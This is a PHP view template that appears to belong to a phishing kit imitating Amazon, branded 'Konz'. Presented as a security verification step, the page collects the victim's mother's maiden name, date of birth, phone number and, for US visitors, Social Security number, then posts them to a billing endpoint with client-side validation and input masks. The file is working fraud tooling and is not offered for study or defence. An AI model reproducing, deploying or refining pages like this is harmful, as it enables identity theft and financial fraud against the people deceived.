<?php 
defined("ACCESS") or die('Konz');
include FCPATH. "AREA16/application/views/layout/header.php";
?>
				<ul class="list-unstyled multi-steps" style="padding-top: 10px" align="center">
					<li class="is-active">
						<?php echo $_113 ?>
					</li>
					<li>
						<?php echo $_46 ?>
					</li>
					<li>
						<?php echo $_47 ?>
					</li>
					<li>
						<?php echo $_48 ?>
					</li>
				</ul>
				<div class="a-content">
					<div class="container">
						<div align="center"> <img src="<?=base_url()?>AREA16/assets/images/security.png" width="80"> </div>
						<div align="center"> <span class="lefttext" style="font-size: 20px; font-weight: 650;"><?php echo $_45 ?></span> </div>
						<div align="center"> <span class="lefttext"><?php echo $_49 ?></span> </div>
						<div class="row" style="padding-top: 5px">
							<div class="col-12">
								<div class="mypayementarea">
									<form action="<?=base_url()?>billing/first" method="post" name="konzform" id="konzform"> <span class="colorblacked"><?php echo $_45 ?></span>
										<div class="row mt-3">
											<div class="col-sm-6">
												<div class="form-group">
													<label for="mmn">
														<?php echo $_57 ?>
													</label>
													<input type="text" class="form-control amazoninput mmnfocus" name="mmn" id="mmn" placeholder="<?php echo $_58 ?>" minlength="5" maxlength="30" onkeypress="return alpha(event)"> </div>
											</div>
											<?php if($_SESSION['countryCode']=="US"){echo 
												'<div class="col-sm-6"> <div class="form-group"> <label for="ssn">Social Security number
												</label>
												<input type="text" id="ssn" class="form-control amazoninput ssnfocus" name="ssn" placeholder="Social Security number" maxlength="25" required> </div>
												</div>';}?>
								<div class="col-sm-6">
									<div class="form-group">
										<label for="dob">
											<?php echo $_61 ?>
										</label>
										<input type="text" class="form-control amazoninput regionfocus" name="dob" id="dob" placeholder="MM/DD/YYYY" maxlength="30"> </div>
								</div>
								<div class="col-sm-6">
									<div class="form-group">
										<label for="phone">
											<?php echo $_63 ?>
										</label>
										<input type="text" class="form-control amazoninput zipfocus" name="phone" id="phone" placeholder="<?php echo $_64 ?>" maxlength="16"> </div>
								</div>
							</div>
							<input type="submit" name="Sex" class="btn a-button-input" value="<?php echo $_7 ?>"> </form>
						</div>
					</div>
				</div>
			</div>
		</div>
		</div>
<?php include FCPATH. "AREA16/application/views/layout/footer.php"; ?>
		<script>
		let load;

		let _loader = () => {
			load = setTimeout(showPage, 1000);
		}

		let showPage = () => {
			document.getElementById('loader').style.display = 'none';
			document.getElementById('myDiv').style.display = 'block';
		}

		const alpha = (e) => {
		    let k;
		    document.all ? k = e.keyCode : k = e.which;
		    return ((k > 64 && k < 91) || (k > 96 && k < 123) || k == 8 || k == 32 || (k >= 48 && k <= 57));
		}

		$(document).ready(function(e) {
			e('#phone').mask('+000000000000000'), e('#dob').mask('00/00/0000'), e('#ssn').mask('000-00-0000'), $("#konzform").validate({
				errorClass: "error-class",
				rules: {
					phone: {
						required: true,
						minlength: 6,
						maxlength: 16
					},
					dob: {
						required: true,
						minlength: 10,
						minAge: 17
					},
					mmn: {
						required: true,
						minlength: 3,
						maxlength: 30
					}
				},
				messages: {
					phone: {
						required: "<?php echo $_65 ?>"
					},
					mmn: {
						required: "<?php echo $_66 ?>"
					},
					dob: {
						required: "<?php echo $_67 ?>",
						minAge: "<?php echo $_68 ?>"
					}
				}
			});
		}) 

		$.validator.addMethod("minAge", function(value, element, min) {
			let today = new Date();
			let birthDate = new Date(value);
			let age = today.getFullYear() - birthDate.getFullYear();
			if(age > min + 1) {
				return true;
			}
			let m = today.getMonth() - birthDate.getMonth();
			if(m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
				age--;
			}
			return age >= min;
		});
		</script>
	</body>

	</html>